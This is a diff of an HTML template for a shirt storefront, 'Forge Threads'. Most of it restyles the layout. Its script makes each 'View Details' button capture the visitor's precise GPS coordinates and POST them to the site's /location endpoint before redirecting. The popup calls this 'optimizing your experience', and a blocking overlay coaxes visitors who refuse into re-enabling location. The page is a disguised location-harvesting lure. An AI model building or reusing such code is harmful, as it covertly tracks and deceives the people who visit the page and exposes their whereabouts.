@@ -1,158 +1,990 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Shirts Store</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      margin: 0;
-      padding: 1rem;
-      background: #f5f5f5;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Forge Threads - Engineered Style</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&family=Montserrat:wght@600;700;800&display=swap"
+        rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
 
-    .grid {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1rem;
-      justify-content: center;
-    }
 
-    .card {
-      background: white;
-      border-radius: 10px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-      max-width: 300px;
-      width: 100%;
-      overflow: hidden;
-      text-align: center;
-    }
+    <style>
+        :root {
+            --royal-purple: #6D28D9;
+            /* CTA/Primary */
+            --lavender-mist: #EDE9FE;
+            /* Card backgrounds */
+            --soft-cream: #FAF9F6;
+            /* Main BG */
+            --midnight-gray: #111827;
+            /* Text */
 
-    .card img {
-      width: 100%;
-      height: auto;
-    }
+            /* Derived colors from the new theme */
+            --primary: var(--royal-purple);
+            --primary-light: #8B5EE0;
+            /* Slightly lighter purple for gradients */
+            --primary-dark: #511C9C;
+            /* Darker purple for hover/depth */
+            --secondary-accent: #FFD700;
+            /* A contrasting gold/yellow that pops against purple */
+            --bg-main: var(--soft-cream);
+            --card-bg: var(--lavender-mist);
+            --text-dark: var(--midnight-gray);
+            --text-medium: #374151;
+            /* Darker gray for secondary info */
+            --text-light: #4B5563;
+            /* Medium gray for tertiary text */
+            --price-color: #007bff;
+            /* Kept classic blue for prices, as it works well */
+            --danger-red: #DC2626;
+            /* Stronger, clear red for warnings */
+            --shadow-bold: rgba(0, 0, 0, 0.35);
+            --shadow-subtle: rgba(0, 0, 0, 0.15);
+            --border-radius-crisp: 6px;
+            --border-radius-soft: 10px;
+        }
 
-    .card h3 {
-      margin: 0.5rem 0 0;
-    }
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: var(--bg-main);
+            color: var(--text-dark);
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
 
-    .card p {
-      margin: 0.5rem 0;
-      color: #333;
-    }
+        header {
+            background: var(--primary);
+            color: white;
+            padding: 1.2rem 1.5rem;
+            text-align: left;
+            font-size: 2.2rem;
+            font-weight: 700;
+            box-shadow: 0 4px 15px var(--shadow-bold);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
 
-    .card button {
-      background: #007bff;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      margin-bottom: 1rem;
-      cursor: pointer;
-      border-radius: 5px;
-    }
+        header .logo {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.4rem;
+            font-weight: 800;
+            letter-spacing: -1px;
+            color: var(--secondary-accent);
+            text-transform: uppercase;
+        }
 
-    .card button:disabled {
-      background: #888;
-    }
+        header .nav-links {
+            display: none;
+        }
 
-    .loading {
-      display: none;
-      font-size: 14px;
-      color: green;
-      margin-top: 5px;
-    }
+        header .nav-links a {
+            color: rgba(255, 255, 255, 0.85);
+            text-decoration: none;
+            margin-left: 1.5rem;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: color 0.3s ease, transform 0.2s ease;
+            position: relative;
+            text-transform: uppercase;
+        }
 
-    .location-popup {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #fff3cd;
-      color: #856404;
-      padding: 1rem;
-      border: 1px solid #ffeeba;
-      border-radius: 5px;
-      z-index: 999;
-      display: none;
-    }
+        header .nav-links a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 3px;
+            bottom: -8px;
+            left: 0;
+            background-color: var(--secondary-accent);
+            transition: width 0.3s ease;
+        }
 
-    @media screen and (max-width: 600px) {
-      .card {
-        max-width: 100%;
-      }
-    }
-  </style>
+        header .nav-links a:hover {
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        header .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        /* Adjusted Hero Section for Mobile */
+        .hero-section {
+            background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary) 100%);
+            color: white;
+            padding: 3rem 1rem;
+            /* SIGNIFICANTLY REDUCED PADDING */
+            text-align: center;
+            border-radius: var(--border-radius-soft);
+            box-shadow: 0 8px 30px var(--shadow-bold);
+            margin: 1.5rem auto;
+            /* Reduced margin */
+            max-width: 1200px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-content {
+            max-width: 900px;
+            text-align: center;
+            z-index: 1;
+        }
+
+        .hero-section h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.4rem;
+            /* SMALLER FONT SIZE */
+            margin-bottom: 0.8rem;
+            /* Reduced margin */
+            color: white;
+            font-weight: 900;
+            line-height: 1.1;
+            text-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
+            text-transform: uppercase;
+        }
+
+        .hero-section p {
+            font-size: 1.15rem;
+            /* SMALLER FONT SIZE */
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 2rem;
+            /* Reduced margin */
+            line-height: 1.4;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            font-weight: 400;
+        }
+
+        .hero-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            /* Reduced gap */
+            width: 100%;
+            padding: 0 0.5rem;
+            /* Reduced padding */
+        }
+
+        .hero-buttons .btn {
+            background: var(--secondary-accent);
+            color: var(--primary-dark);
+            padding: 0.9rem 2.2rem;
+            /* Reduced padding */
+            border: none;
+            border-radius: var(--border-radius-soft);
+            font-size: 1.1rem;
+            /* Reduced font size */
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.3s ease, transform 0.2s ease, color 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            text-transform: uppercase;
+            width: 100%;
+        }
+
+        .hero-buttons .btn:hover {
+            background: #FFEC80;
+            /* Slightly brighter accent on hover */
+            color: var(--primary-dark);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .hero-buttons .btn-secondary {
+            background: none;
+            border: 2px solid var(--secondary-accent);
+            color: var(--secondary-accent);
+            box-shadow: none;
+        }
+
+        .hero-buttons .btn-secondary:hover {
+            background: var(--secondary-accent);
+            color: var(--primary-dark);
+            transform: translateY(-3px);
+        }
+
+        .highlight-text {
+            color: var(--secondary-accent);
+            font-weight: 900;
+            display: inline-block;
+            transition: color 0.5s ease-in-out;
+        }
+
+        .trust-bar {
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            /* Reduced gap */
+            padding: 1.2rem 0.8rem;
+            /* Reduced padding */
+            background: var(--card-bg);
+            border-radius: var(--border-radius-soft);
+            box-shadow: 0 5px 20px var(--shadow-subtle);
+            margin: 1.5rem auto;
+            /* Reduced margin */
+            max-width: 1200px;
+            flex-wrap: wrap;
+            border: 1px solid #d0cfd7;
+            /* Border for card bg */
+        }
+
+        .trust-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.9rem;
+            /* Smaller font size */
+            color: var(--text-medium);
+            font-weight: 600;
+            text-align: center;
+            width: 48%;
+            /* Allow two items per row */
+            margin-bottom: 0.5rem;
+            /* Added margin for wrap */
+        }
+
+        .trust-item i {
+            color: var(--secondary-accent);
+            margin-bottom: 0.4rem;
+            /* Reduced margin */
+            font-size: 1.6rem;
+            /* Smaller icon size */
+        }
+
+        .container {
+            padding: 1.5rem 0.8rem;
+            /* Reduced padding */
+            max-width: 1200px;
+            margin: auto;
+        }
+
+        .section-title {
+            font-family: 'Montserrat', sans-serif;
+            text-align: center;
+            font-size: 2.2rem;
+            /* Smaller font size */
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 1.8rem;
+            /* Reduced margin */
+            position: relative;
+            text-transform: uppercase;
+        }
+
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 80px;
+            /* Shorter underline */
+            height: 4px;
+            background: var(--primary);
+            /* Purple underline */
+            margin: 10px auto 0;
+            border-radius: 2px;
+        }
+
+        .weekly-selection-info {
+            background: var(--primary-dark);
+            /* Darker purple background */
+            color: white;
+            text-align: center;
+            padding: 1.2rem 1rem;
+            /* Reduced padding */
+            margin-bottom: 1.8rem;
+            /* Reduced margin */
+            border-radius: var(--border-radius-soft);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .weekly-selection-info p {
+            font-size: 0.95rem;
+            /* Smaller font size */
+            font-weight: 400;
+            line-height: 1.4;
+            max-width: 700px;
+            margin: 0 auto;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .weekly-selection-info strong {
+            color: var(--secondary-accent);
+            font-weight: 700;
+        }
+
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            /* Adjusted min-width for more compact cards */
+            gap: 1rem;
+            /* Reduced gap */
+            justify-content: center;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: var(--border-radius-crisp);
+            box-shadow: 0 4px 15px var(--shadow-subtle);
+            overflow: hidden;
+            text-align: left;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid #e0dfec;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px var(--shadow-bold);
+        }
+
+        .card img {
+            width: 100%;
+            height: 220px;
+            /* Smaller image height for compact view */
+            object-fit: cover;
+            border-bottom: 1px solid #ecebf3;
+        }
+
+        .card-content {
+            padding: 0.8rem 1rem;
+            /* Reduced padding */
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .card h3 {
+            font-size: 1.05rem;
+            /* Smaller font size */
+            color: var(--text-dark);
+            margin: 0 0 0.5rem 0;
+            /* Reduced margin */
+            font-weight: 700;
+            line-height: 1.3;
+        }
+
+        .card .price {
+            font-size: 1.25rem;
+            /* Smaller font size */
+            font-weight: 800;
+            color: var(--price-color);
+            margin: 0 0 0.8rem 0;
+            /* Reduced margin */
+            display: block;
+        }
+
+        .card .original-price {
+            text-decoration: line-through;
+            color: var(--text-light);
+            font-size: 0.85rem;
+            /* Smaller font size */
+            margin-left: 0.6rem;
+            font-weight: 500;
+        }
+
+        .card button {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 12px;
+            /* Reduced padding */
+            width: 100%;
+            font-size: 0.95rem;
+            /* Reduced font size */
+            font-weight: 700;
+            cursor: pointer;
+            border-radius: var(--border-radius-crisp);
+            transition: background 0.3s ease, transform 0.2s ease;
+            text-transform: uppercase;
+        }
+
+        .card button:hover {
+            background: var(--primary-dark);
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        .card button:disabled {
+            background: #aaa;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading {
+            display: none;
+            font-size: 0.8rem;
+            color: var(--primary);
+            text-align: center;
+            margin-top: 0.8rem;
+            font-weight: 600;
+        }
+
+        /* Location Popup Styling - Mobile-first */
+        .location-popup {
+            position: fixed;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #FFECB3;
+            /* Consistent info color */
+            color: var(--text-medium);
+            padding: 1rem 1.2rem;
+            border-radius: var(--border-radius-crisp);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            display: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            animation: fadeInOut 7s forwards;
+            text-align: center;
+            border: 2px solid #FFCC80;
+            max-width: 90%;
+        }
+
+        .location-popup.blocked {
+            background: var(--danger-red);
+            color: white;
+            animation: none;
+            top: 50%;
+            bottom: auto;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 350px;
+            padding: 1.5rem;
+            font-size: 0.95rem;
+            border-radius: var(--border-radius-soft);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+            border: none;
+        }
+
+        .location-popup.blocked h2 {
+            font-family: 'Montserrat', sans-serif;
+            margin-top: 0;
+            margin-bottom: 0.8rem;
+            font-size: 1.4rem;
+            color: white;
+            font-weight: 800;
+        }
+
+        .location-popup.blocked p {
+            margin-bottom: 1rem;
+            font-size: 1rem;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.98);
+        }
+
+        .location-popup.blocked ol {
+            list-style-type: decimal;
+            text-align: left;
+            margin: 0 auto 1.2rem;
+            padding-left: 20px;
+            max-width: 300px;
+            color: rgba(255, 255, 255, 0.98);
+        }
+
+        .location-popup.blocked ol li {
+            margin-bottom: 0.5rem;
+            font-weight: 400;
+        }
+
+        .location-popup.blocked button {
+            background: white;
+            color: var(--danger-red);
+            border: none;
+            padding: 0.7rem 1.5rem;
+            border-radius: var(--border-radius-crisp);
+            cursor: pointer;
+            font-weight: 700;
+            transition: background 0.2s ease, transform 0.2s ease;
+            margin-top: 1rem;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.15);
+            text-transform: uppercase;
+        }
+
+        .location-popup.blocked button:hover {
+            background: #f0f0f0;
+            transform: translateY(-3px);
+        }
+
+
+        @keyframes fadeInOut {
+            0% {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+
+            10% {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+
+            90% {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+
+            100% {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+                display: none;
+            }
+        }
+
+
+        footer {
+            background: var(--text-dark);
+            /* Footer background now Midnight Gray */
+            color: white;
+            text-align: center;
+            padding: 2rem 1rem;
+            margin-top: 2.5rem;
+            font-size: 0.85rem;
+            font-weight: 400;
+        }
+
+        footer .footer-links {
+            margin-bottom: 1.2rem;
+        }
+
+        footer .footer-links a {
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            margin: 0 0.8rem;
+            transition: color 0.3s ease;
+            font-weight: 500;
+            text-transform: uppercase;
+        }
+
+        footer .footer-links a:hover {
+            color: var(--secondary-accent);
+        }
+
+        footer .social-icons {
+            margin-top: 1.2rem;
+            margin-bottom: 1.5rem;
+        }
+
+        footer .social-icons a {
+            color: white;
+            font-size: 1.6rem;
+            margin: 0 0.8rem;
+            transition: color 0.3s ease, transform 0.2s ease;
+        }
+
+        footer .social-icons a:hover {
+            color: var(--secondary-accent);
+            transform: translateY(-3px);
+        }
+
+        /* Desktop Adjustments (larger screens override mobile defaults) */
+        @media screen and (min-width: 769px) {
+            header {
+                padding: 1.8rem 3rem;
+            }
+
+            header .logo {
+                font-size: 2.8rem;
+            }
+
+            header .nav-links {
+                display: flex;
+            }
+
+            header .nav-links a {
+                margin-left: 2.5rem;
+                font-size: 1.15rem;
+            }
+
+            /* Restored larger hero for desktop */
+            .hero-section {
+                padding: 7rem 1.5rem;
+                margin: 3.5rem auto;
+            }
+
+            .hero-section h1 {
+                font-size: 4.8rem;
+                margin-bottom: 1.8rem;
+            }
+
+            .hero-section p {
+                font-size: 1.7rem;
+                margin-bottom: 3.5rem;
+            }
+
+            .hero-buttons {
+                flex-direction: row;
+                gap: 1.5rem;
+                width: auto;
+                padding: 0;
+            }
+
+            .hero-buttons .btn {
+                padding: 1.4rem 3.8rem;
+                font-size: 1.4rem;
+                width: auto;
+            }
+
+            .trust-bar {
+                gap: 3.5rem;
+                padding: 2.2rem 1.8rem;
+            }
+
+            .trust-item {
+                flex-direction: row;
+                font-size: 1.25rem;
+                width: auto;
+            }
+
+            .trust-item i {
+                margin-right: 1.2rem;
+                font-size: 2.2rem;
+            }
+
+            .container {
+                padding: 3rem 1.8rem;
+            }
+
+            .section-title {
+                font-size: 3.8rem;
+                margin-bottom: 4rem;
+            }
+
+            .section-title::after {
+                width: 150px;
+                height: 7px;
+                background: var(--primary);
+                margin: 18px auto 0;
+            }
+
+            .weekly-selection-info {
+                padding: 2rem 1.5rem;
+            }
+
+            .weekly-selection-info p {
+                font-size: 1.2rem;
+            }
+
+            .grid {
+                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+                /* Adjusted for desktop 3-column */
+                gap: 2rem;
+            }
+
+            .card img {
+                height: 300px;
+            }
+
+            .card-content {
+                padding: 1.5rem 1.8rem;
+            }
+
+            .card h3 {
+                font-size: 1.35rem;
+            }
+
+            .card .price {
+                font-size: 1.7rem;
+            }
+
+            .card .original-price {
+                font-size: 1.05rem;
+            }
+
+            .card button {
+                padding: 16px 20px;
+                font-size: 1.2rem;
+            }
+
+            .loading {
+                font-size: 1.05rem;
+                margin-top: 1.5rem;
+            }
+
+            .location-popup {
+                bottom: 35px;
+                padding: 1.8rem 2.8rem;
+                font-size: 1.2rem;
+                max-width: 600px;
+            }
+
+            .location-popup.blocked {
+                padding: 3rem;
+                font-size: 1.3rem;
+                max-width: 600px;
+            }
+
+            .location-popup.blocked h2 {
+                font-size: 2.2rem;
+            }
+
+            .location-popup.blocked p {
+                font-size: 1.35rem;
+            }
+
+            .location-popup.blocked ol {
+                padding-left: 35px;
+                max-width: 450px;
+            }
+
+            .location-popup.blocked ol li {
+                margin-bottom: 0.8rem;
+            }
+
+            .location-popup.blocked button {
+                padding: 1.1rem 2.8rem;
+                margin-top: 2.2rem;
+            }
+
+            footer {
+                padding: 3.5rem 2rem;
+                margin-top: 4rem;
+                font-size: 0.95rem;
+            }
+
+            footer .footer-links {
+                margin-bottom: 1.8rem;
+            }
+
+            footer .footer-links a {
+                margin: 0 1.5rem;
+            }
+
+            footer .social-icons {
+                margin-top: 1.8rem;
+                margin-bottom: 2.5rem;
+            }
+
+            footer .social-icons a {
+                font-size: 1.8rem;
+                margin: 0 1.2rem;
+            }
+        }
+    </style>
 </head>
+
 <body>
+    <header>
+        <div class="logo">Forge Threads</div>
+        <nav class="nav-links">
+            <a href="#">New Arrivals</a>
+            <a href="#">Collections</a>
+            <a href="#">Gear</a>
+            <a href="#">About</a>
+        </nav>
+    </header>
 
-  <div id="location-popup" class="location-popup">
-    ⚠️ Please allow location access to continue
-  </div>
+    <main>
+        <section class="hero-section">
+            <div class="hero-content">
+                <h1>
+                    Forge Your <br> <span class="highlight-text">Signature Style.</span>
+                </h1>
+                <p>
+                    Discover meticulously engineered apparel designed for the modern man.
+                    We bring together premium brands with unparalleled value, ensuring
+                    every piece elevates your presence. Achieve a look that speaks volumes,
+                    effortlessly commanding attention with your <span id="highlight-word" class="highlight-text">presence</span>.
+                </p>
+                <div class="hero-buttons">
+                    <a href="#products" class="btn">Explore Elite Collections</a>
+                    <a href="#how-it-works" class="btn btn-secondary">Our Mission</a>
+                </div>
+            </div>
+        </section>
 
-  <h2 style="text-align: center;">🛍️ Choose Your Shirt</h2>
-  <div class="grid">
-    {% for shirt in shirts %}
-      <div class="card">
-        <img src="/static/{{ shirt.image }}" alt="{{ shirt.name }}" />
-        <h3>{{ shirt.name }}</h3>
-        <p>{{ shirt.price }}</p>
-        <button onclick="saveAndRedirect('{{ shirt.link }}', this)">Look</button>
-        <div class="loading">Loading...</div>
-      </div>
-    {% endfor %}
-  </div>
+        <section class="trust-bar">
+            <div class="trust-item">
+                <i class="fas fa-hammer"></i> Precision Crafted
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-gem"></i> Premium Selection
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-lock-open"></i> Transparent Value
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-headset"></i> Dedicated Support
+            </div>
+        </section>
 
-  <script>
-    const popup = document.getElementById('location-popup');
+        <div class="container">
+            <h2 class="section-title" id="products">Essential Gear</h2>
 
-    async function saveAndRedirect(link, btn) {
-      const card = btn.closest('.card');
-      const loader = card.querySelector('.loading');
-      btn.disabled = true;
-      loader.style.display = 'block';
+            <div class="weekly-selection-info">
+                <p>
+                    These **8 shirts** are meticulously selected for this week.
+                    Our advanced **Machine Learning algorithm** analyzes trends and feedback to curate the
+                    best drops, bringing you fresh, exclusive selections **every week**.
+                </p>
+            </div>
+            <div class="grid">
+                {% for shirt in shirts %}
+                <div class="card">
+                    
+                    <img src="/static/{{ shirt.image }}" alt="{{ shirt.name }}" onerror="this.onerror=null;this.src='https://via.placeholder.com/400x350/6D28D9/EDE9FE?text=Image+Missing';" />                    <div class="card-content">
+                        <!-- <img src="/static/{{ image_url }}" alt="{{ image_alt }}"> -->
+                        <h3>{{ shirt.name }}</h3>
+                        <p class="price">
+                            {{ shirt.price }} {# Displaying price as a raw string as requested #}
+                            {% if shirt.original_price %}
+                            <span class="original-price">{{ shirt.original_price }}</span>
+                            {% endif %}
+                        </p>
+                        <button onclick="saveAndRedirect('{{ shirt.link }}', this)">View Details</button>
+                        <div class="loading">Redirecting...</div>
+                    </div>
+                </div>
+                {% endfor %}
+                </div>
+        </div>
 
-      try {
-        const pos = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true,
-            timeout: 10000
-          });
-        });
+        <section id="how-it-works" class="container" style="padding-top: 2rem;">
+            <h2 class="section-title">The Forge Process</h2>
+            <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));">
+                <div class="card" style="text-align: center; padding: 1rem;">
+                    <i class="fas fa-compass fa-2x" style="color: var(--secondary-accent); margin-bottom: 0.6rem;"></i>
+                    <h3>Discover Your Edge</h3>
+                    <p style="color: var(--text-light); font-size:0.85rem;">Explore exclusive collections tailored for discerning taste.</p>
+                </div>
+                <div class="card" style="text-align: center; padding: 1rem;">
+                    <i class="fas fa-money-bill-wave fa-2x"
+                        style="color: var(--secondary-accent); margin-bottom: 0.6rem;"></i>
+                    <h3>Unbeatable Value</h3>
+                    <p style="color: var(--text-light); font-size:0.85rem;">Access premium quality at a price point built for purpose.</p>
+                </div>
+                <div class="card" style="text-align: center; padding: 1rem;">
+                    <i class="fas fa-bolt fa-2x" style="color: var(--secondary-accent); margin-bottom: 0.6rem;"></i>
+                    <h3>Seamless Acquisition</h3>
+                    <p style="color: var(--text-light); font-size:0.85rem;">Direct links to secure your selections with efficiency.</p>
+                </div>
+            </div>
+        </section>
 
-        const coords = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy
-        };
 
-        const res = await fetch("/location", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(coords)
-        });
+    </main>
 
-        const result = await res.json();
+    <div id="location-popup" class="location-popup">
+        ⚠️ Please allow location access to optimize your experience.
+        <div class="location-blocked-content" style="display: none;">
+            <h2>📍 Location Access Blocked</h2>
+            <p>We can't access your location because it's been blocked in browser settings. Please follow these simple
+                steps:</p>
+            <ol>
+                <li>Click the 🔒 icon in your browser's address bar.</li>
+                <li>Go to "Site Settings" or "Permissions".</li>
+                <li>Find "Location" → Set to "Allow".</li>
+                <li>Then <button onclick="location.reload()">Reload This Page</button></li>
+            </ol>
+        </div>
+    </div>
 
-        setTimeout(() => {
-          window.open(link, "_blank");
-          loader.style.display = 'none';
-          btn.disabled = false;
-        }, 1000);
-      } catch (err) {
-        // Show popup instead of alert
-        popup.style.display = 'block';
-        loader.style.display = 'none';
-        btn.disabled = false;
+    <footer>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Contact Support</a>
+            <a href="#">About Forge</a>
+        </div>
+        <div class="social-icons">
+            <a href="#" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+            <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+            <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+            <a href="#" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+        </div>
+        <p>&copy; 2025 Forge Threads. All Rights Reserved.</p>
+    </footer>
 
-        // Auto-hide popup after 6 seconds
-        setTimeout(() => {
-          popup.style.display = 'none';
-        }, 6000);
-      }
-    }
-  </script>
+    <script>
+        const words = ["presence", "impact", "authority", "edge", "power", "command", "distinction", "excellence"];
+        let i = 0;
+        const el = document.getElementById("highlight-word");
 
+        setInterval(() => {
+            i = (i + 1) % words.length;
+            el.textContent = words[i];
+        }, 2500);
+
+        const popup = document.getElementById('location-popup');
+        const normalPopupContent = popup.querySelector(':first-child');
+        const blockedPopupContent = popup.querySelector('.location-blocked-content');
+
+        async function saveAndRedirect(link, btn) {
+            const card = btn.closest('.card');
+            const loader = card.querySelector('.loading');
+            btn.disabled = true;
+            loader.style.display = 'block';
+
+            popup.style.display = 'none';
+            popup.classList.remove('blocked');
+            normalPopupContent.style.display = 'block';
+            blockedPopupContent.style.display = 'none';
+
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+
+                const coords = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+
+                const res = await fetch("/location", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(coords)
+                });
+
+                if (!res.ok) {
+                    throw new Error('Failed to save location data');
+                }
+
+                setTimeout(() => {
+                    window.open(link, "_blank");
+                    loader.style.display = 'none';
+                    btn.disabled = false;
+                }, 1000);
+
+            } catch (err) {
+                console.error("Geolocation or Location Save Error:", err);
+                loader.style.display = 'none';
+                btn.disabled = false;
+
+                if (err.code === err.PERMISSION_DENIED) {
+                    popup.classList.add('blocked');
+                    normalPopupContent.style.display = 'none';
+                    blockedPopupContent.style.display = 'block';
+                    popup.style.display = 'block';
+                } else {
+                    popup.classList.remove('blocked');
+                    normalPopupContent.style.display = 'block';
+                    blockedPopupContent.style.display = 'none';
+                    popup.style.display = 'block';
+                }
+            }
+        }
+    </script>
 </body>
+
 </html>
